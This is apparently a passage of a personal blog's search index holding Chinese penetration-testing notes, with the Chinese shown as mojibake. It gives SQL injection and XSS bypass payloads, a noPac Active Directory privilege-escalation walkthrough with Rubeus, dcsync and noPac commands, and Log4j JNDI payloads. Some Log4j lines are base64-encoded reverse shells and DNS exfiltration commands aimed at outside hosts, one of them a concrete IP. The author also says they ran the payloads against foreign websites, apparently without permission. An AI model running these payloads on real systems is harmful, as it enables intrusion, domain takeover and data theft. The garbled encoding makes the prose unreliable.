<p>regexp â€˜^eâ€™ åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºe</p>
<p><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP &#39;^e&#39; LIMIT 0,1) </code> # åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸æ˜¯ e</p>
<br>

<p>regexp â€˜^e[a-z]â€™ åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬äºŒä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­</p>
<p><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP &#39;^e[a-z]&#39; LIMIT 0,1)</code></p>
]]></content>
  </entry>
  <entry>
    <title>ä¿¡æ¯æ”¶é›†å¯èƒ½ä¼šç”¨åˆ°çš„ç«™ç‚¹</title>
    <url>/posts/4259031d/</url>
    <content><![CDATA[<p>å›½å®¶ä¼ä¸šä¿¡ç”¨ä¿¡æ¯å…¬ç¤ºç³»ç»Ÿ ç½‘å€ï¼š<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a><br>é¦™æ¸¯æŸ¥å†Œä¸­å¿ƒç½‘å€ï¼š<a href="https://www.icris.cr.gov.hk/csci/">https://www.icris.cr.gov.hk/csci/</a><br>å°æ¹¾å•†å·¥è¡Œæ”¿åŠ¡æœåŠ¡å…¥å£ç½‘<a href="https://findbiz.nat.gov.tw/fts/query/QueryBar/queryInit.do">https://findbiz.nat.gov.tw/fts/query/QueryBar/queryInit.do</a><br>è‹±å›½å·¥å•†ä¿¡æ¯<a href="https://www.gov.uk/government/organisations/companies-house">https://www.gov.uk/government/organisations/companies-house</a><br>ç¾å›½å·¥å•†ä¿¡æ¯ç½‘å€ï¼š<a href="http://www.wysk.com/index/">http://www.wysk.com/index/</a><br>æ–°åŠ å¡å·¥å•†ä¿¡æ¯ç½‘ç«™ï¼š<a href="https://www.acra.gov.sg/home/">https://www.acra.gov.sg/home/</a><br>æ¾³å¤§åˆ©äºšå·¥å•†ä¿¡æ¯ç½‘å€ï¼š<a href="http://abr.business.gov.au/">http://abr.business.gov.au</a><br>å°åº¦å·¥å•†ä¿¡æ¯ ç½‘å€ï¼š<a href="http://www.mca.gov.in/">http://www.mca.gov.in</a><br>ç¬¬ä¸‰æ–¹ä¼ä¸šæŸ¥è¯¢ç½‘ç«™  ç½‘å€ï¼š<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>ä¼æŸ¥æŸ¥ ç½‘å€ï¼š<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>çˆ±ä¼æŸ¥ ç½‘å€ï¼š<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>å¯ä¿¡å®  ç½‘å€ï¼š<a href="https://www.qixin.com/">https://www.qixin.com/</a><br>Opencorporates ç½‘å€ï¼š<a href="https://opencorporates.com/">https://opencorporates.com/</a> å¯æŸ¥è¯¢å…¨çƒå…¬å¸åŸºæœ¬å·¥å•†ä¿¡æ¯ã€‚<br>Google  <a href="https://www.google.co.jp/">https://www.google.co.jp/</a><br>ç™¾åº¦ ç½‘å€ï¼š<a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
]]></content>
      <categories>
        <category>ä¿¡æ¯æ”¶é›†</category>
      </categories>
      <tags>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡XXSç»•è¿‡å­¦ä¹ </title>
    <url>/posts/b6714d8e/</url>
    <content><![CDATA[<p>å‚è€ƒåŸæ–‡ <a href="https://mp.weixin.qq.com/s/ZCWdfnObwBkHUR8he6XxlA">https://mp.weixin.qq.com/s/ZCWdfnObwBkHUR8he6XxlA</a></p>
<h3 id="alertç»•è¿‡"><a href="#alertç»•è¿‡" class="headerlink" title="alertç»•è¿‡"></a>alertç»•è¿‡</h3><p>alert(1)   â€” &gt;    a=alert;a(1) </p>
<br>

<h3 id="äº‹ä»¶æ‹¦æˆªç»•è¿‡"><a href="#äº‹ä»¶æ‹¦æˆªç»•è¿‡" class="headerlink" title="äº‹ä»¶æ‹¦æˆªç»•è¿‡"></a>äº‹ä»¶æ‹¦æˆªç»•è¿‡</h3><p><code>&lt;input type=&quot;text&quot; pattern=&quot;a&quot;  oninvalid=&quot;alert(1)&quot; /&gt; </code></p>
<p>oninvalidäº‹ä»¶ä¼šä»¥æ­£åˆ™è¡¨è¾¾å¼å»åˆ¤æ–­patternçš„å€¼ï¼Œå¦‚æœè¾“å…¥æ¡†å†…çš„å€¼ä¸å…¨ç­‰ä½™â€œaâ€ </p>
<p><code>&lt;input type=&quot;text&quot; pattern=&quot;a&quot;  oninvalid=&quot;a=alert;a(1)&quot; /&gt;</code></p>
<br>

<h3 id="disableå±æ€§ç»•è¿‡"><a href="#disableå±æ€§ç»•è¿‡" class="headerlink" title="disableå±æ€§ç»•è¿‡"></a>disableå±æ€§ç»•è¿‡</h3><p>disable=â€disableâ€  â€”&gt; a=â€disable=â€disableâ€</p>
<br>

<br>

<br>

<p>xss æ’å…¥çš„ type å³æ˜¯ text åˆæ˜¯ submitï¼Œåœ¨æ–‡æœ¬æ¡†ä¸­æŒ‰å›è½¦å³å¯è§¦å‘</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">oninvalid</span>=<span class="string">a</span>=<span class="string">alert;a(1)</span> <span class="attr">pattern</span>=<span class="string">&quot;a&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">a</span>=<span class="string">&quot; disabled=&quot;</span><span class="attr">disabled</span>&quot; <span class="attr">style</span>=<span class="string">&quot;margin-top: 1px;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>CVE-2021-42287/CVE-2021-42278å¤ç°</title>
    <url>/posts/1fd95242/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>CVE-2021-42278ï¼Œæœºå™¨è´¦æˆ·çš„åå­—ä¸€èˆ¬æ¥è¯´åº”è¯¥ä»¥$ç»“å°¾ï¼Œä½†ADæ²¡æœ‰å¯¹åŸŸå†…æœºå™¨è´¦æˆ·ååšéªŒè¯ã€‚</p>
<p>CVE-2021-42287ï¼Œä¸ä¸Šè¿°æ¼æ´é…åˆä½¿ç”¨ï¼Œåˆ›å»ºä¸DCæœºå™¨è´¦æˆ·åå­—ç›¸åŒçš„æœºå™¨è´¦æˆ·ï¼ˆä¸ä»¥$ç»“å°¾ï¼‰ï¼Œè´¦æˆ·è¯·æ±‚ä¸€ä¸ªTGTåï¼Œæ›´åè´¦æˆ·ï¼Œç„¶åé€šè¿‡S4U2selfç”³è¯·TGS Ticketï¼Œæ¥ç€DCåœ¨TGS_REPé˜¶æ®µï¼Œè¿™ä¸ªè´¦æˆ·ä¸å­˜åœ¨çš„æ—¶å€™ï¼ŒDCä¼šä½¿ç”¨è‡ªå·±çš„å¯†é’¥åŠ å¯†TGS Ticketï¼Œæä¾›ä¸€ä¸ªå±äºè¯¥è´¦æˆ·çš„PACï¼Œç„¶åæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªé«˜æƒé™STã€‚</p>
<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ">https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ</a> </p>
<p><a href="https://www.cnblogs.com/mrhonest/p/15682858.html">https://www.cnblogs.com/mrhonest/p/15682858.html</a></p>
<p><a href="https://heibai.org.cn/2071.html">https://heibai.org.cn/2071.html</a></p>
<h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>åŸŸå†…æ™®é€šç”¨æˆ·</p>
<p><code>lab\user01 </code>  / <code>Test.123</code></p>
<p>Win2008</p>
<p>Win2012</p>
<h3 id="å¤ç°è¸©å‘"><a href="#å¤ç°è¸©å‘" class="headerlink" title="å¤ç°è¸©å‘"></a><em>å¤ç°</em>è¸©å‘</h3><h4 id="åˆ›å»ºåŸŸç”¨æˆ·hello"><a href="#åˆ›å»ºåŸŸç”¨æˆ·hello" class="headerlink" title="åˆ›å»ºåŸŸç”¨æˆ·hello"></a>åˆ›å»ºåŸŸç”¨æˆ·hello</h4><p>è¿™é‡Œä½¿ç”¨ä¸€ä¸ªåŸŸå†…æ™®é€šç”¨æˆ·è¿›è¡Œç™»å½•  ä¸‹è½½Powermad.ps1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount hello -Domain lab.com -DomainController DC01.lab.com -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="/posts/1fd95242/1.png" alt="æˆªå›¾"></p>
<p><img src="/posts/1fd95242/2.png" alt="æˆªå›¾"></p>
<p>æˆåŠŸåˆ›å»ºç”¨æˆ·test</p>
<h4 id="åˆ é™¤spnè®°å½•"><a href="#åˆ é™¤spnè®°å½•" class="headerlink" title="åˆ é™¤spnè®°å½•"></a>åˆ é™¤spnè®°å½•</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powerview.ps1</span><br><span class="line">Set-DomainObject &quot;CN=hello,CN=Computers,DC=lab,DC=com&quot;  -Clear &#x27;serviceprincipalname&#x27; -Verbose</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…ˆç”¨<code>setspn</code>æŸ¥ä¸€ä¸‹ </p>
<p><code>setspn -Q */* | findstr hola</code></p>
<p><img src="/posts/1fd95242/3.png" alt="æˆªå›¾"></p>
<br>

<p>è¿™é‡Œ æˆ‘å¦èµ·äº†ä¸€ä¸ªpowershellå»å¼•ç”¨æ¡Œé¢ä¸Šçš„cmd ç»“æœä¼šæŠ¥é”™ ï¼Œç„¶åæŠŠpowerviewæ”¾åœ¨PowermadåŒç›®å½•ä¸‹å¯¼å…¥å°±ä¸æŠ¥é”™äº†â€¦. ï¼ˆä¸çŸ¥é“ä¸ºå•¥â€¦ï¼‰</p>
<p><img src="/posts/1fd95242/4.png" alt="æˆªå›¾"></p>
<p>ç§»åŠ¨åå°±æ­£å¸¸äº†</p>
<p><img src="/posts/1fd95242/5.png" alt="æˆªå›¾"></p>
<p>(<del>åœ¨win2012powershellä¸‹ Set-DomainObjectæ²¡æœ‰è¿™ä¸ªä¸œè¥¿ï¼Ÿï¼Ÿï¼Ÿï¼ï¼ï¼)â€¦</del></p>
<p>å‘ç°ä¸¤ä¸ªpowerview.ps1 å¤§å°ä¸ä¸€æ · ä¸æ˜¯åŒä¸€ä¸ª æœäº†â€¦â€¦ ä¸€ä¸ª700+K ä¸€ä¸ª300+K</p>
<p>ç„¶åå»å°è¯•åˆ é™¤spn ã€‚ã€‚ã€‚</p>
<p><img src="/posts/1fd95242/6.png" alt="æˆªå›¾"></p>
<br>

<h4 id="é‡è®¾æœºå™¨å"><a href="#é‡è®¾æœºå™¨å" class="headerlink" title="é‡è®¾æœºå™¨å"></a>é‡è®¾æœºå™¨å</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount hello -Value &quot;DC01&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>

<p>æ”¹ä¸ºåŸŸæ§å</p>
<p><img src="/posts/1fd95242/7.png" alt="æˆªå›¾"></p>
<h4 id="è¯·æ±‚TGT"><a href="#è¯·æ±‚TGT" class="headerlink" title="è¯·æ±‚TGT"></a>è¯·æ±‚TGT</h4><p><del>win2008ä¸‹ä½¿ç”¨Rubeus.exeæŠ¥é”™.......$#%@&amp;@!#@!â€¦â€¦.</del></p>
<p><del>å»githubä¸Šä¸‹è½½ä¸‹æ¥ç¼–è¯‘ä¸€ä¸‹ ç„¶ååœ¨win2008ä¸Šè¿è¡Œ è¯´ç¼ºå°‘.net4.0 ç„¶åå»ä¸‹è½½ä¸‹æ¥å®‰è£…ï¼Œç»“æœå®‰è£…è¶…æ—¶äº†ï¼Œè¿™å°æœºå™¨çš„ç½‘ç»œâ€¦</del></p>
<p>åé¢æ‰¾äº†ä¸ª .net4.5å…å®‰è£…ç‰ˆå°±å¯ç”¨å»ä½¿ç”¨Rebuesã€‚ã€‚ã€‚ã€‚</p>
<br>

<h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><h4 id="åˆ›å»ºæœºå™¨ç”¨æˆ·hello"><a href="#åˆ›å»ºæœºå™¨ç”¨æˆ·hello" class="headerlink" title="åˆ›å»ºæœºå™¨ç”¨æˆ·hello"></a>åˆ›å»ºæœºå™¨ç”¨æˆ·hello</h4><h4 id="åˆ é™¤spnè®°å½•-1"><a href="#åˆ é™¤spnè®°å½•-1" class="headerlink" title="åˆ é™¤spnè®°å½•"></a>åˆ é™¤spnè®°å½•</h4><p><img src="/posts/1fd95242/8.png" alt="æˆªå›¾"></p>
<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="é‡æ–°è®¾ç½®æœºå™¨å"><a href="#é‡æ–°è®¾ç½®æœºå™¨å" class="headerlink" title="é‡æ–°è®¾ç½®æœºå™¨å"></a>é‡æ–°è®¾ç½®æœºå™¨å</h4><p><img src="/posts/1fd95242/9.png" alt="æˆªå›¾"></p>
<br>

<h4 id="è¯·æ±‚TGT-1"><a href="#è¯·æ±‚TGT-1" class="headerlink" title="è¯·æ±‚TGT"></a>è¯·æ±‚TGT</h4><p><img src="/posts/1fd95242/10.png" alt="æˆªå›¾"></p>
<br>

<h4 id="æ¢å¤åŸæ¥çš„æœºå™¨å±æ€§"><a href="#æ¢å¤åŸæ¥çš„æœºå™¨å±æ€§" class="headerlink" title="æ¢å¤åŸæ¥çš„æœºå™¨å±æ€§"></a>æ¢å¤åŸæ¥çš„æœºå™¨å±æ€§</h4><p><img src="/posts/1fd95242/11.png" alt="æˆªå›¾"></p>
<br>

<h4 id="è·å–ç¥¨æ®"><a href="#è·å–ç¥¨æ®" class="headerlink" title="è·å–ç¥¨æ®"></a>è·å–ç¥¨æ®</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:DC01.lab.com /self /altservice:LDAP/DC01.lab.com  /ptt /ticket:doIElDCCBJCgAwIBBaEDAgEWooIDvDCCA7hhggO0MIIDsKADAgEFoQkbB0xBQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2xhYi5jb22jggN+MIIDeqADAgESoQMCAQKiggNsBIIDaIW9iHW2Vv1XWw71Yc6V1rdL7m2Mwmzw+rj6X1OQqR1lNapte8JpgGMN/EW+0FWCqpkFBYYR0q+ljSY56LIpTNSYK2V4ZEPmBTv/iZtG3rvGdHafJxyD3b/GfWSVLt3c1Ev7LGf9mUP/tDzsxQ46mDgdbUiuB5B7/z9vaj7h71J8M2bkIUfeP4xgNcxR5PvLbQsyp6KE54WXRxpreU4ibz8vsplH3i8sKzrPFRM1w7m2XFBonMc1A3oElU16aHwIsDUew60eRa/wqAkIl9cmO7d/hSux+7aM7ta7Q3+JfnyOYjl0BQMbzK+gDdqtdcgkycjG/W/+EPbqUHin8wKrY3O8SHix2K1Dq0VIp+GegeiiSlLvk7q+1CixSbo2DxSFAkKDyTUx8YfqSTLzy6scD4Hyi8GSVZCNf2vCTL8KFpSHyPtMURaZitv5YOmBVlK0gq73cKTst6cGzCN0h9XLVOm+RGbjLShOWpsJ4P+9pKLS12PN9EgughEHbCen0Hv2dXLfe+dwDL6Gd5A+TYbsNIyfHrxLhcdu6H1bW6cKSZaXfASM/1RyXUA15O0b0y5uh8PpQd82ptvckHkSa2gHqamM08UsUs60H5OPzGRSvtNskOHgFkDYcX6MgKJNFOq+g+J/EKchSS0yIc</span><br><span class="line">0iJPCoFLaTCSvlMmq3G5/4epI0gjwx6a6oeUTutxc8MfnHL2kAYxW7tgezuDxKVno4LZFVJWKbObrXctu2i16Dr7m5eLgyuKf5UQ41RiOUoTSLQUt4s2gq73/NG1MzwRmPq5Z+cWmXDzVual58Mm5W4fipIYqPg88Wnm+/WmxYi0ICQgxhJENaZQf3UM0fXKSjTzgVWHkFRfaGx4uaAqzn8MKs4FtCmSf+OVEf7QW0imtvDAsQNixLU8ZTF+OK6rZDs76GB43KUxlhPUTl7NE9kpzlwcef8HiRc4rSsc386/NeqsSDjZXgqYcAAQX7v0tNJ0lt+sRrg6GQT7YYHegOMQ9ywBgvdMVAFAzEPMnmW7GhHCOhubxHtDzAEDgkmpM0LXdE27m0acD6XyrRTPdf8slsKD1GliX5iW77L9+qqThwBmb9xRMFgNRFGJDE62g0SlY3+QY1IRpdAUqCuBHKctmeyWemDVBlJWbmqooHwBU3HwOxe8J+TPUevVBko4HDMIHAoAMCAQCigbgEgbV9gbIwga+ggawwgakwgaagGzAZoAMCARehEgQQHKpy33rwHG1c49Aha5Vzp6EJGwdMQUIuQ09NohEwD6ADAgEBoQgwBhsEREMwMaMHAwUAQOEAAKURGA8yMDIxMTIyMTA3MTEwN1qmERgPMjAyMTEyMjExNzExMDdapxEYDzIwMjExMjI4MDcxMTA3WqgJGwdMQUIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdsYWIuY29t</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><del>è¿™é‡Œä¸ç®¡ä½¿ç”¨cmd è¿˜æ˜¯powershell  å‘½ä»¤å¤ªé•¿äº†è¢«åˆ†æˆäº†ä¸¤ä¸ªâ€¦â€¦ï¼Ÿï¼Ÿï¼Ÿ</del></p>
<p>é¢ å±…ç„¶æ˜¯åœ¨å¤åˆ¶æ—¶å€™ å¤ªé•¿notepadç»™è‡ªå·±æ¢è¡Œäº†</p>
<p><img src="/posts/1fd95242/12.png" alt="æˆªå›¾"></p>
<br>

<h4 id="è·å–krbtgtç”¨æˆ·çš„NTLM-Hash"><a href="#è·å–krbtgtç”¨æˆ·çš„NTLM-Hash" class="headerlink" title="è·å–krbtgtç”¨æˆ·çš„NTLM Hash"></a>è·å–krbtgtç”¨æˆ·çš„NTLM Hash</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /user:lab\krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/posts/1fd95242/13.png" alt="æˆªå›¾"></p>
<br>

<h4 id="æ¸…é™¤ç¥¨æ®"><a href="#æ¸…é™¤ç¥¨æ®" class="headerlink" title="æ¸…é™¤ç¥¨æ®"></a>æ¸…é™¤ç¥¨æ®</h4><p><code>klist purge</code></p>
<br>

<h3 id="noPac"><a href="#noPac" class="headerlink" title="noPac"></a>noPac</h3><p><a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
<p><a href="https://github.com/waterrr/noPac?ref=pythonawesome.com">https://github.com/waterrr/noPac?ref=pythonawesome.com</a></p>
<p>åœ¨win2008ä¸‹ æç¤ºéœ€è¦ .Net4.0 ç»“æœå®‰è£…å¤±è´¥äº†..</p>
<p>ç„¶åæ¢win2012R2 çš„ä¸€å°åŸŸæœºå™¨å»å¤ç°</p>
<p>0x01 æ‰«ææ¢æµ‹</p>
<p><code>noPac.exe -scan  -domain lab.com -user user01 -pass Test.123</code>  ï¼ˆè¿™é‡Œå¯†ç åŠ â€™â€™ä¼šæŠ¥é”™ï¼‰</p>
<p><img src="/posts/1fd95242/14.png" alt="æˆªå›¾"></p>
<p>å¤ç°å¤±è´¥ï¼Œå¯ç”¨åˆ›å»ºç”¨æˆ·ï¼Œä½†æ˜¯å†</p>
<p>ç„¶åå°è¯•å†è¿™ä¸ªæ™®é€šåŸŸç”¨æˆ·ä¸‹å»å®‰è£…python ä½†æ˜¯æŠ¥é”™ç­–ç•¥XX å¤±è´¥  pythonå®‰è£…ä¹Ÿè¶…æ—¶äº† **@#ï¿¥@**@$@#</p>
<p> å»å°è¯•å®‰è£…ã€‚net4.5  è¿˜æ˜¯è¶…æ—¶äº† è¿™ä¸ªåŸŸç¯å¢ƒæ˜¯åˆ«äººç»™æˆ‘çš„  çœŸ***çƒ‚ï¼ŒPTT,PTK,PTHéƒ½å®éªŒä¸äº† æœºå™¨ç½‘ä¹Ÿé—®é¢˜å¾ˆå¤§ èƒ½è®¿é—®bing åˆ«çš„è®¿é—®ä¸äº†â€¦.</p>
<h4 id="è¸©å®Œçš„åçš„åˆ©ç”¨ã€‚ã€‚ã€‚"><a href="#è¸©å®Œçš„åçš„åˆ©ç”¨ã€‚ã€‚ã€‚" class="headerlink" title="è¸©å®Œçš„åçš„åˆ©ç”¨ã€‚ã€‚ã€‚"></a>è¸©å®Œçš„åçš„åˆ©ç”¨ã€‚ã€‚ã€‚</h4><h5 id="æ‰«ææ¢æµ‹"><a href="#æ‰«ææ¢æµ‹" class="headerlink" title="æ‰«ææ¢æµ‹"></a>æ‰«ææ¢æµ‹</h5><p><code>noPac.exe scan -domain lab.com -user user01 -pass Test.123</code>  è¿™é‡Œå¯†ç å¤„ç½‘ä¸ŠåŠ çš„â€™â€™ä½†æ˜¯è¿™é‡Œæˆ‘åŠ ä¸Šå°±ä¼šæŠ¥é”™ ä¸åŠ çš„è¯å¯æ­£å¸¸ä½¿ç”¨</p>
<p><img src="/posts/1fd95242/15.png" alt="æˆªå›¾"></p>
<h5 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><p><code>./noPac.exe -domain attack.local -user oa -pass &#39;!@#Qz123&#39; /dc dc.attack.local /mAccount test123 /mPassword passW0rd /service cifs /ptt</code></p>
<p><code>ls  \\DC01.lab.com\C$ </code></p>
<p><img src="/posts/1fd95242/16.png" alt="æˆªå›¾"></p>
<br>

<p>è¿˜æœ‰ä¸ªpythonç‰ˆçš„noPac ä½†æ˜¯è¿™å°æœºå™¨ä¸Šçš„pythonæ˜¯ç¦»çº¿å®‰è£…çš„ pipè¿˜ä¸çŸ¥é“æ€ä¹ˆå®‰ â”­â”®ï¹â”­â”® è¸©å‘è¸©äº†ä¸€å¤©ç»ˆäºèƒ½å¤ç°åˆ°äº†</p>
<br>

<h4 id="noPacï¼ˆpythonï¼‰"><a href="#noPacï¼ˆpythonï¼‰" class="headerlink" title="noPacï¼ˆpythonï¼‰"></a>noPacï¼ˆpythonï¼‰</h4><p> <a href="https://github.com/waterrr/noPac?ref=pythonawesome.com">https://github.com/waterrr/noPac?ref=pythonawesome.com</a></p>
<br>

<h4 id="Sam-the-admin"><a href="#Sam-the-admin" class="headerlink" title="Sam_the_admin"></a>Sam_the_admin</h4><p>CVE-2021-42287/CVE-2021-42278 Attack</p>
<p>Python åˆ©ç”¨è„šæœ¬ï¼š<a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
<p><code>python3 sam_the_admin.py &quot;redteam/saul:Red12345&quot; -dc-ip 10.10.10.8 -shell</code></p>
<p>è¿™ä¸ªè¿˜æ²¡å°è¯• <a href="https://heibai.org.cn/2071.html">https://heibai.org.cn/2071.html</a></p>
<br>

<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™ä¸ªæ´å¤ç°è¸©äº†å¥½å¤šå‘â€¦.ç”¨äº†ä¸€å¤©çš„æ—¶é—´â€¦.</p>
<p>ç”±äºæµ‹è¯•æœºå™¨ä½¿ç”¨çš„åŸŸå†…æ™®é€šç”¨æˆ·ï¼Œåœ¨ä¸‹è½½ã€å®‰è£…ä¸Šéƒ½ä¼šå—åˆ°é™åˆ¶ï¼Œç„¶åé€‰æ‹©é‡‡å–ä½¿ç”¨ç¦»çº¿å®‰è£…çš„æ–¹å¼å»ä¸‹è½½ç›¸å…³ç‰ˆæœ¬ï¼Œåªä¸‹è½½äº†å…å®‰è£…çš„.net 4.6å’Œ py3.7 ä½†æ˜¯py3çš„pipè¿˜æ²¡æ•´ä¸Šå»ï¼Œåç»­çš„expè„šæœ¬å°±æ²¡æœ‰æµ‹è¯•ã€‚</p>
<p>è¿˜æœ‰å°±æ˜¯å› ä¸ºæ˜¯åœ¨è™šæ‹Ÿæœºä¸Šè¿è¡Œçš„ï¼Œä¸”æ˜¯ä½¿ç”¨çš„åŸŸå†…æ™®é€šç”¨æˆ·ï¼Œå› æ­¤è¿™ä¸ªvmtools æ— æ³•ç›´æ¥ä»å¤–é¢å¤åˆ¶è¿›æ¥æ–‡ä»¶ï¼Œè€Œä¸”åœ¨å°è¯•ç›´æ¥ä½¿ç”¨python httpæœåŠ¡å»ä¸‹è½½æ˜¯ é»˜è®¤æµè§ˆå™¨å­˜åœ¨å®‰å…¨ç­–ç•¥ï¼Œè€Œæ™®é€šç”¨æˆ·æ— æ³•å…³é—­ï¼Œç„¶åæˆ‘å»ç”¨administratorå»å…³é—­äº†IEå®‰å…¨ç­–ç•¥åï¼Œè¿˜æ˜¯å­˜åœ¨å®‰å…¨ç­–ç•¥ï¼Œç„¶åæ²¡æ³•ä½¿ç”¨ã€‚åªèƒ½é€šè¿‡åœ¨æµ‹è¯•æœºå™¨ä¸Šå»è®¿é—®administratorç›®å½•ä¸‹ ä»å¤–é¢æ‹–è¿›æ¥çš„æ‰€éœ€è¦çš„æ–‡ä»¶</p>
]]></content>
      <categories>
        <category>ææƒ</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j_rceåˆ©ç”¨</title>
    <url>/posts/5bd4bc7e/</url>
    <content><![CDATA[<p>ç¨‹åºåœ¨ä½¿ç”¨æ—¥å¿—è¯»å–ç”¨æˆ·è¾“å…¥æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„ä»£ç ${}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://f03b65e6.dns.1433.eu.org./exp&#125;</span><br><span class="line"></span><br><span class="line">1.7</span><br><span class="line"></span><br><span class="line">$&#123;jndi:ldap://IP:1389/shzltp&#125;</span><br><span class="line">ldap://IP:1389/shzltp</span><br><span class="line"></span><br><span class="line">1.8</span><br><span class="line">$&#123;jndi:ldap://IP:1389/ojzxns&#125;</span><br><span class="line">ldap://IP:1389/ojzxns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bashè½¬ç &quot; -A  IP</span><br><span class="line"></span><br><span class="line">ping `whoami`.48f3ebc4.dns.1433.eu.org.</span><br><span class="line">bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A  IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/IP/3344 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  -A  IP</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ„Ÿè§‰å¯¹äºä¸€äº›å°å‹ä¼ä¸šåŸºæœ¬ä¸ä¼šå»ä½¿ç”¨è¿™ä¸ªä¸œè¥¿ï¼Œå¯¹äºå¤§å‹ç«™ç‚¹å¯èƒ½ä¼šå»ä½¿ç”¨ï¼Œä½†æ˜¯å¾€å¾€ä»–ä»¬çš„é˜²æŠ¤ä¹ŸåŠæ—¶ï¼Œä»Šå¤©ä¸‹åˆè¯•äº†ä¸€äº›å›½å¤–ç«™ç‚¹ï¼ŒåŸºæœ¬ä¸Šéƒ½ä¸å‡ºç½‘æ²¡æ³•æˆåŠŸåˆ©ç”¨ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>log4j</category>
      </categories>
      <tags>
        <tag>log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>iptablesç®€å•ä½¿ç”¨</title>
    <url>/posts/1d385bbc/</url>
